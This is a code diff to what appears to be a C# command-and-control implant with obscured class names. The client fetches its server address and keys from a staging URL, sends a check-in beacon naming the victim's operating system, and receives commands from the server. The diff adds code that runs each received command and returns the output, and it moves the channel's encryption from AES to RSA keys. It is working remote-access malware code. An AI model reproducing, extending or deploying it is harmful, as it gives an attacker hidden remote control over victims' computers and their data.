@@ -16,9 +16,10 @@ namespace cevsn
 {
     public class Cevsn
     {
-        public static String URL = "http://127.0.0.1:8082/initial.txt";
+        public static String URL = "http://127.0.0.1:8082/initialRSA.txt";
         public static String UUID = Guid.NewGuid().ToString();
-        public volatile static byte[] KEY = new byte[256];
+        public volatile static string Key = "";
+        public volatile static string PrivKey = "";
         public volatile static byte[] IV = new byte[16];
         public volatile static String IP = "";
         public volatile static int PORT = 0;
@@ -58,7 +59,7 @@ namespace cevsn
                         if(Type.Equals("TCP"))
                         {
                             Console.Write("in tcp\n");
-                            tevsn = CreateTevsn(IP, PORT, KEY, IV, Pass, Salt);
+                            tevsn = CreateTevsn(IP, PORT, Key);
                             tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
                             if(tevsn.Connect())
                             {
@@ -70,7 +71,13 @@ namespace cevsn
                                     {
                                         Console.Write("Sending to Server first Conn!\n");
                                         tevsn.Send(UUID + ": just arrived to vacation on: " + getOsName());
-                                        tevsn.Receive();
+                                        URL = "http://127.0.0.1:8082/"+UUID+".txt";
+                                        Thread.Sleep(5000);
+                                        string cont = getContent();
+                                        parseHostInformation(cont);
+                                        tevsn.PrivKey = PrivKey;
+                                        string recv1 = tevsn.Receive();
+                                        tevsn.Send(tevsn.exec(recv1));
                                         IsConnected = tevsn.IsConnected();
                                         first = true;
                                         Thread.Sleep(1000);
@@ -136,18 +143,19 @@ namespace cevsn
                 PORT = Int32.Parse(lines[1]);
                 byte[] typeTmp = Convert.FromBase64String(lines[2]);
                 Type = System.Text.Encoding.ASCII.GetString(typeTmp);
-                KEY = Convert.FromBase64String(lines[3]);
-                IV = Convert.FromBase64String(lines[4]);
-                Pass = lines[5];
-                byte[] saltTmp = Convert.FromBase64String(lines[6]);
-                Salt = System.Text.Encoding.ASCII.GetString(saltTmp);
+                Key = lines[3];
+                if(lines.Length > 4)
+                {
+                    Console.Write("Got PRIV!\n");
+                    PrivKey = lines[4];
+                }
                 gotHostInformation = true;
             }
         }
 
-        public static Tevsn CreateTevsn(string ip, int port, byte[] key, byte[] iv, string pass, string salt)
+        public static Tevsn CreateTevsn(string ip, int port, string key)
         {
-            return new Tevsn(ip, port, key, iv, pass, salt);
+            return new Tevsn(ip, port, key);
         }
     }
 }
